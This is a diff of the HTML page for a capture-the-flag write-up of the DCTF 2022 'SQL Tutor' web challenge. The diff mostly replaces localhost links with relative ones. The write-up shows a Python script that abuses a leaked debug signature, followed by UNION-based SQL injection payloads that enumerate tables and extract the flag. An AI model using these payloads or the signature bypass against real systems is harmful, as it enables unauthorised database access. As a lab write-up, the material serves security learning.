@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<head>
 
   <meta charset="utf-8" />
 
@@ -36,7 +36,7 @@
     <meta name="twitter:title" content="SQL Tutor challenge writeup">
     <meta name="twitter:description" content="DCTF 2022 was held from the 15th of April Until the 17th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was ranked easy.
 ">
-    <meta name="twitter:image" content="//localhost:1313/media/CTFs/Flag.png">
+    <meta name="twitter:image" content="/media/CTFs/Flag.png">
   
 
   
@@ -44,8 +44,8 @@
   <meta property="og:title" content="SQL Tutor challenge writeup">
   <meta property="og:description" content="DCTF 2022 was held from the 15th of April Until the 17th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was ranked easy.
 ">
-  <meta property="og:url" content="//localhost:1313/post/sql-tutor/">
-  <meta property="og:image" content="//localhost:1313/media/CTFs/Flag.png">
+  <meta property="og:url" content="/post/sql-tutor/">
+  <meta property="og:image" content="/media/CTFs/Flag.png">
 
 
 
@@ -53,7 +53,7 @@
 <meta name="generator" content="Hugo 0.86.1">
 
 
-<link rel="canonical" href="//localhost:1313/post/sql-tutor/">
+<link rel="canonical" href="/post/sql-tutor/">
 
 <meta name="renderer" content="webkit">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -78,20 +78,20 @@
 <meta name='msapplication-navbutton-color' content="#02b875">
 <meta name="msapplication-TileColor" content="#02b875">
 <meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
-<link rel="icon" href="//localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/icons/icon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/icons/icon-32x32.png">
-<link rel="icon" sizes="192x192" href="//localhost:1313/icons/icon-192x192.png">
-<link rel="apple-touch-icon" href="//localhost:1313/icons/icon-152x152.png">
-<link rel="manifest" href="//localhost:1313/manifest.json">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
 
 
-<link rel="preload" href="//localhost:1313/styles/main-rendered.min.css" as="style">
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
 
 
 <link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
-<link rel="preload" href="//localhost:1313/images/avatar.gif" as="image">
-<link rel="preload" href="//localhost:1313/images/test.jpg" as="image">
+<link rel="preload" href="/images/avatar.gif" as="image">
+<link rel="preload" href="/images/test.jpg" as="image">
 
 
 <style>
@@ -99,7 +99,7 @@
     background: rgb(244, 243, 241) url('/images/test.jpg') repeat fixed;
   }
 </style>
-<link rel="stylesheet" href="//localhost:1313/styles/main-rendered.min.css">
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
 
 
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
@@ -139,9 +139,9 @@
     
     
   <header class="site-header">
-  <a href="//localhost:1313/"><img class="avatar" src="//localhost:1313/images/avatar.gif" alt="Avatar"></a>
+  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
   
-  <h2 class="title"><a href="//localhost:1313/">0xMesbaha</a></h2>
+  <h2 class="title"><a href="">0xMesbaha</a></h2>
   
   <p class="subtitle"></p>
   <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
@@ -159,21 +159,21 @@
           
           
           ">
-          <a href="//localhost:1313/">Posts</a>
+          <a href="/">Posts</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="//localhost:1313/tags/">Tags</a>
+          <a href="/tags/">Tags</a>
         </li>
       
         <li class="menu-item
           
           
           ">
-          <a href="//localhost:1313/about/">About</a>
+          <a href="/about/">About</a>
         </li>
       
     </ul>
@@ -246,9 +246,9 @@
 </table>
 <h2 id="discovery">Discovery</h2>
 <p>we are introduced with this page which execute fixed SQL statements and take one input to fill the <code>...</code> in the query</p>
-<p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416155837.png" alt="image"></p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416155837.png" alt="image"></p>
 <p>However it wasn&rsquo;t that easy , there are some filters for special characters like <code>[ ' &quot; `] </code> and for some words like  <code>UNION</code></p>
-<p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416155856.png" alt="image"></p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416155856.png" alt="image"></p>
 <h2 id="enumeration">Enumeration</h2>
 <p>Intercepting the request with Burpsuite to see what is going on , we can see the following :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">POST /verify_and_sign_text HTTP/1.1
@@ -286,14 +286,14 @@ text<span style="color:#f92672">=</span>dGVzdG1l&amp;signature<span style="color
 </code></pre></div><p>and this request will be issued only if the first request passed returns <code>status:ok</code> , sending the latest request to the repeater to view the response we can see response body as :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#f92672">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;ok&#34;</span>,<span style="color:#f92672">&#34;query&#34;</span>:<span style="color:#e6db74">&#34;SELECT * FROM users WHERE users.name=&#39;testme&#39;&#34;</span>,<span style="color:#f92672">&#34;results&#34;</span>:[],<span style="color:#f92672">&#34;description&#34;</span>:<span style="color:#e6db74">&#34;This query selects all users with the name &#39;testme&#39;.&#34;</span>,<span style="color:#f92672">&#34;debug&#34;</span>:<span style="color:#66d9ef">null</span>}
 </code></pre></div><p>and we can see <code>&quot;debug:null&quot;</code> , we can try to add it as a parameter in the <code>/execute</code> request and will have the following results</p>
-<p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416161431.png" alt="image"></p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416161431.png" alt="image"></p>
 <p>we know now the steps it passed through before the execution , so we know that :</p>
 <pre><code>2 requests are issued :
 1st one make sure the text doesn't contain a blacklisted element &quot;the check is at the client side&quot;
 2nd one will decode the text form base64 , verify the signature and then execute the query
 </code></pre><p>we can skip the first request easily and focus on the 2nd request , providing the <code>debug</code> parameter to know the tests we failed or passed</p>
 <p>if we try to change the base64 encoded text in the request the old signature will not work</p>
-<p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416162046.png" alt="image"></p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416162046.png" alt="image"></p>
 <p>and thanks to the <code>debug</code> parameter we know what value should this signature be , so basically we need to issue the request 2 times one to get the valid signature and the other to send the payload associated with the valid signature</p>
 <h2 id="exploitation">Exploitation</h2>
 <p>we can automate the process to save the time and for efficiency , Let&rsquo;s Build the script :</p>
@@ -317,7 +317,7 @@ data <span style="color:#f92672">=</span> {
 
 r1<span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>data)
 print(r1<span style="color:#f92672">.</span>text)
-</code></pre></div><p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416162632.png" alt="image"></p>
+</code></pre></div><p><img src="/media/CTFs/SQL_Tutor/20220416162632.png" alt="image"></p>
 <p>we will extract the signature value then update the signature parameter in the next request</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">resp<span style="color:#f92672">=</span>r1<span style="color:#f92672">.</span>text
 signature<span style="color:#f92672">=</span> resp<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&#34;compare&#34;:&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">40</span>]
@@ -325,27 +325,27 @@ signature<span style="color:#f92672">=</span> resp<span style="color:#f92672">.<
 data[<span style="color:#e6db74">&#34;signature&#34;</span>]<span style="color:#f92672">=</span>signature
 r2<span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>data)
 print(r2<span style="color:#f92672">.</span>text)
-</code></pre></div><p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416162839.png" alt="image"></p>
+</code></pre></div><p><img src="/media/CTFs/SQL_Tutor/20220416162839.png" alt="image"></p>
 <p>Great the signature is okay and the query is executed , now we are ready to inject our text in the statement to be executed</p>
 <p>From the debug output the query is :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-SQL" data-lang="SQL"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> users.name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test&#39;</span>
 </code></pre></div><p>we need to know number of columns first , update the payload variable :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;a&#39; order by 8-- &#34;&#34;&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
-</code></pre></div><p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416163416.png" alt="image"></p>
+</code></pre></div><p><img src="/media/CTFs/SQL_Tutor/20220416163416.png" alt="image"></p>
 <p>keep fuzzing downwards until</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;a&#39; order by 4-- &#34;&#34;&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
-</code></pre></div><p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416163440.png" alt="image"></p>
+</code></pre></div><p><img src="/media/CTFs/SQL_Tutor/20220416163440.png" alt="image"></p>
 <p>we know it has 4 columns , now let&rsquo;s enumerate the tables names :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;a&#39; UNION SELECT 1,2,3,table_name FROM information_schema.tables--&#34;&#34;&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
 </code></pre></div><p>and we got this huge output :</p>
-<p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416163702.png" alt="image"></p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416163702.png" alt="image"></p>
 <p>Beautifying the output , we can notice the <code>flags</code> table :</p>
-<p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416163812.png" alt="image"></p>
+<p><img src="/media/CTFs/SQL_Tutor/20220416163812.png" alt="image"></p>
 <ul>
 <li>Let&rsquo;s update our payload :</li>
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;a&#39; UNION SELECT 1,2,3,flag FROM flags-- &#34;&#34;&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)
-</code></pre></div><p><img src="//localhost:1313/media/CTFs/SQL_Tutor/20220416163929.png" alt="image"></p>
+</code></pre></div><p><img src="/media/CTFs/SQL_Tutor/20220416163929.png" alt="image"></p>
 <p>and finally the flag is here</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dctf<span style="color:#f92672">{</span>Pump_7h3_s7r3am_h4s5_up!_353aa965<span style="color:#f92672">}</span>
 </code></pre></div><p><img src="https://media.giphy.com/media/CyoQdbc7FHqqTpkSPI/giphy.gif" alt=""></p></article>
@@ -353,11 +353,11 @@ print(r2<span style="color:#f92672">.</span>text)
       
       <ul class="post-tags">
         
-          <li><a href="//localhost:1313/tags/ctf"><span class="tag">CTF</span></a></li>
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
         
-          <li><a href="//localhost:1313/tags/sql-injection"><span class="tag">SQL Injection</span></a></li>
+          <li><a href="/tags/sql-injection"><span class="tag">SQL Injection</span></a></li>
         
-          <li><a href="//localhost:1313/tags/python"><span class="tag">Python</span></a></li>
+          <li><a href="/tags/python"><span class="tag">Python</span></a></li>
         
       </ul>
       
@@ -411,7 +411,7 @@ print(r2<span style="color:#f92672">.</span>text)
 
 
 
-<script src="//localhost:1313/scripts/index.min.js"></script>
+<script src="/scripts/index.min.js"></script>
 
 <script>
   if ('serviceWorker' in navigator) {
